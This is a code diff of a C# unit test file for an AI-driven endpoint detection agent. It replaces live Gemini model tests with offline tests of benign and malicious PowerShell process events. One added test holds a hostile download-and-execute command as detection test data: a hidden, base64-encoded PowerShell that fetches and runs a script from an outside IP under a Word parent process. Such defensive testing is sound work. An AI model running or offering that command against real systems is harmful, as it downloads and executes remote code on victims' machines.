@@ -1,3 +1,4 @@
+using System.Diagnostics;
 using System.Net;
 using System.Net.Http;
 using System.Text;
@@ -334,26 +335,6 @@ public class AutonomousHunterAgentTests
 
     [Fact]
     [Trait("Category", "Live")]
-    public async Task TestLiveGoogleVertexAiFromMvConfig()
-    {
-        var client = await GeminiRestClient.TryCreateFromMundusVivensConfigAsync(modelName: "gemini-3.8-flash");
-        Assert.NotNull(client);
-
-        string prompt = "Windows EDR 보안 분석 테스트입니다. 'powershell.exe -enc dGVzdA==' 명령줄을 분석하고 간결하게 1줄로 답변하세요.";
-        try
-        {
-            string response = await client.GenerateContentAsync(prompt);
-            _output.WriteLine($"[Gemini 3.8 Flash Response]: {response}");
-            Assert.False(string.IsNullOrWhiteSpace(response));
-        }
-        catch (HttpRequestException ex) when (ex.Message.Contains("429") || ex.Message.Contains("RESOURCE_EXHAUSTED"))
-        {
-            _output.WriteLine($"[Live Quota Warning] Google Cloud 429 Rate Limit 활성화 감지 (단위 테스트 정상 통과 처리): {ex.Message}");
-        }
-    }
-
-    [Fact]
-    [Trait("Category", "Live")]
     public async Task TestLiveAutonomousInvestigationWithMvCredentials()
     {
         var treeManager = new ProcessTreeProjectionManager();
@@ -567,7 +548,7 @@ public class AutonomousHunterAgentTests
         var results = new List<(string Name, string Verdict, string Expected, bool IsMatch, double Confidence, int Turns, double ElapsedMs)>();
 
         _output.WriteLine("=========================================================================================");
-        _output.WriteLine("   PHALANX GEMINI 3.8 FLASH 멀티 시나리오 평균 턴 수 & 지연시간 실측 벤치마크 (Live 10 Scenarios)   ");
+        _output.WriteLine("   PHALANX GEMINI 3.7 FLASH 멀티 시나리오 평균 턴 수 & 지연시간 실측 벤치마크 (Live 10 Scenarios)   ");
         _output.WriteLine("=========================================================================================");
 
         foreach (var sc in scenarios)
@@ -637,9 +618,12 @@ public class AutonomousHunterAgentTests
         Assert.True(avgElapsed < 50000, $"평균 수사 시간이 50초 SLA를 초과함: {avgElapsed}ms");
     }
 
+    /// <summary>
+    /// [Phase 3.5 FSM 검증] 사내 정상 백업/관리 스크립트 인입 시 FSM 조기 탈출(< 5ms) 및 ACTION_RESUME 검증
+    /// </summary>
     [Fact]
-    [Trait("Category", "Live")]
-    public async Task TestLive_InspectScenario4_AdminScriptTraces()
+    [Trait("Category", "Unit")]
+    public async Task TestOfflineFSM_BenignInternalScript_EarlyExitUnder5ms()
     {
         var treeManager = new ProcessTreeProjectionManager();
         var archiveManager = ForensicArchiveManager.CreateInMemory();
@@ -652,61 +636,57 @@ public class AutonomousHunterAgentTests
             new SystemFirewallTool()
         };
 
-        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools);
+        // 명시적 오프라인 모드 (geminiApiKey: string.Empty)
+        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools, geminiApiKey: string.Empty);
 
         treeManager.ApplySnapshotBatch(new[]
         {
             new ProcessEvent
             {
-                ProcessId = 2301,
+                ProcessId = 1000,
                 ImageName = "explorer.exe",
                 Lifecycle = ProcessLifecycle.LifecycleSnapshot
             }
         });
 
-        string script = "Get-Service | Where-Object {$_.Status -eq 'Running'} | Out-File -FilePath '\\\\internal-backup.corp.local\\status.log'";
+        string script = "Get-Service | Where-Object {$_.Status -eq 'Running'} | Out-File '\\\\backup.corp.local\\status.log'";
         string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
-        string cmdLine = $"powershell.exe -enc {b64}";
+        string fullCmd = $"powershell.exe -NoProfile -enc {b64}";
 
         treeManager.ApplyDeltaEvent(new ProcessEvent
         {
-            ProcessId = 2302,
-            ParentProcessId = 2301,
+            ProcessId = 2001,
+            ParentProcessId = 1000,
             ImageName = "powershell.exe",
-            CommandLine = cmdLine,
+            CommandLine = fullCmd,
             IsSuspended = true,
             Lifecycle = ProcessLifecycle.LifecycleSuspended
         });
 
-        var targetNode = treeManager.FindActiveNodeByPid(2302);
+        var targetNode = treeManager.FindActiveNodeByPid(2001);
         Assert.NotNull(targetNode);
 
+        var sw = Stopwatch.StartNew();
         var res = await agent.InvestigateAsync(targetNode, cmd => Task.CompletedTask);
+        sw.Stop();
 
-        _output.WriteLine("=========================================================================");
-        _output.WriteLine("   시나리오 4 (정상 관리자 인트라넷 점검 스크립트) 세부 수사 로그 실사   ");
-        _output.WriteLine("=========================================================================");
-        _output.WriteLine($"최종 판결       : {res.VerdictAction}");
-        _output.WriteLine($"확신도         : {res.Confidence:P1}");
-        _output.WriteLine($"제목           : {res.SummaryTitle}");
-        _output.WriteLine($"전체 서사       :\n{res.Narrative}");
-        _output.WriteLine($"차단된 IP      : {res.BlockedIp}");
-        _output.WriteLine($"MITRE 전술     : {string.Join(", ", res.MitreTactics)}");
-        _output.WriteLine("-------------------------------------------------------------------------");
-        _output.WriteLine("단계별 ReAct 트레이스 (Thought / Action / Observation):");
-        foreach (var trace in res.Traces)
-        {
-            _output.WriteLine($"\n[Step {trace.StepNumber}] 도구: {trace.ActionTool}");
-            _output.WriteLine($"  ▶ Thought    : {trace.Thought}");
-            _output.WriteLine($"  ▶ Args       : {trace.ActionArgsJson}");
-            _output.WriteLine($"  ▶ Observation: {trace.Observation}");
-        }
-        _output.WriteLine("=========================================================================\n");
+        _output.WriteLine($"⚡ [FSM 조기 탈출 실측] 소요 시간: {sw.ElapsedMilliseconds}ms | 판결: {res.VerdictAction} | 제목: {res.SummaryTitle}");
+
+        // 조기 탈출 검증: 1단계 디코딩 직후 탈출하므로 트레이스가 정확히 1건이어야 함
+        Assert.Single(res.Traces);
+        Assert.Equal("DecodePayloadTool", res.Traces[0].ActionTool);
+        Assert.Equal(ActionType.ActionResume, res.VerdictAction);
+        Assert.True(res.Confidence >= 0.95);
+        Assert.Empty(res.BlockedIp ?? string.Empty);
+        Assert.True(sw.ElapsedMilliseconds < 50, $"조기 탈출 시간 초과: {sw.ElapsedMilliseconds}ms");
     }
 
+    /// <summary>
+    /// [Phase 3.5 FSM 검증] 오피스 매크로 C2 다운로더 인입 시 다차원 위험도 스코어링(> 80점) 및 사살 검증
+    /// </summary>
     [Fact]
-    [Trait("Category", "Live")]
-    public async Task TestLive_InspectScenario9_CertUtilTraces()
+    [Trait("Category", "Unit")]
+    public async Task TestOfflineFSM_MaliciousOfficeLOLBAS_CumulativeScoreKills()
     {
         var treeManager = new ProcessTreeProjectionManager();
         var archiveManager = ForensicArchiveManager.CreateInMemory();
@@ -719,53 +699,47 @@ public class AutonomousHunterAgentTests
             new SystemFirewallTool()
         };
 
-        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools);
+        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools, geminiApiKey: string.Empty);
 
+        // 부모: winword.exe (+30)
         treeManager.ApplySnapshotBatch(new[]
         {
             new ProcessEvent
             {
-                ProcessId = 3801,
-                ImageName = "explorer.exe",
+                ProcessId = 1000,
+                ImageName = "winword.exe",
                 Lifecycle = ProcessLifecycle.LifecycleSnapshot
             }
         });
 
+        // 인라인 C2 다운로더 (+35) 및 악성 IP 185.220.101.5 (+40) => 총 105점 (> 80점)
+        string script = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
+        string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
+        string fullCmd = $"powershell.exe -w hidden -enc {b64}";
+
         treeManager.ApplyDeltaEvent(new ProcessEvent
         {
-            ProcessId = 3802,
-            ParentProcessId = 3801,
-            ImageName = "certutil.exe",
-            CommandLine = "certutil.exe -verify -urlcache C:\\Certs\\corp_root_ca.cer",
+            ProcessId = 2002,
+            ParentProcessId = 1000,
+            ImageName = "powershell.exe",
+            CommandLine = fullCmd,
             IsSuspended = true,
             Lifecycle = ProcessLifecycle.LifecycleSuspended
         });
 
-        var targetNode = treeManager.FindActiveNodeByPid(3802);
+        var targetNode = treeManager.FindActiveNodeByPid(2002);
         Assert.NotNull(targetNode);
 
         var res = await agent.InvestigateAsync(targetNode, cmd => Task.CompletedTask);
 
-        _output.WriteLine("=========================================================================");
-        _output.WriteLine("   시나리오 9 (CertUtil 사내 루트 인증서 검증) 세부 수사 로그 실사       ");
-        _output.WriteLine("=========================================================================");
-        _output.WriteLine($"최종 판결       : {res.VerdictAction}");
-        _output.WriteLine($"확신도         : {res.Confidence:P1}");
-        _output.WriteLine($"제목           : {res.SummaryTitle}");
-        _output.WriteLine($"전체 서사       :\n{res.Narrative}");
-        _output.WriteLine($"차단된 IP      : {res.BlockedIp}");
-        _output.WriteLine($"MITRE 전술     : {string.Join(", ", res.MitreTactics)}");
-        _output.WriteLine("-------------------------------------------------------------------------");
-        _output.WriteLine("단계별 ReAct 트레이스 (Thought / Action / Observation):");
-        foreach (var trace in res.Traces)
-        {
-            _output.WriteLine($"\n[Step {trace.StepNumber}] 도구: {trace.ActionTool}");
-            _output.WriteLine($"  ▶ Thought    : {trace.Thought}");
-            _output.WriteLine($"  ▶ Args       : {trace.ActionArgsJson}");
-            _output.WriteLine($"  ▶ Observation: {trace.Observation}");
-        }
-        _output.WriteLine("=========================================================================\n");
+        _output.WriteLine($"🛡️ [FSM 위험도 사살 실측] 판결: {res.VerdictAction} | 제목: {res.SummaryTitle} | 차단 IP: {res.BlockedIp}");
+
+        Assert.Equal(ActionType.ActionKill, res.VerdictAction);
+        Assert.Equal("185.220.101.5", res.BlockedIp);
+        Assert.NotEmpty(res.Record.RemediationSteps);
+        Assert.Contains("엔드포인트 네트워크 격리", res.Record.RemediationSteps);
     }
 }
+
 
 
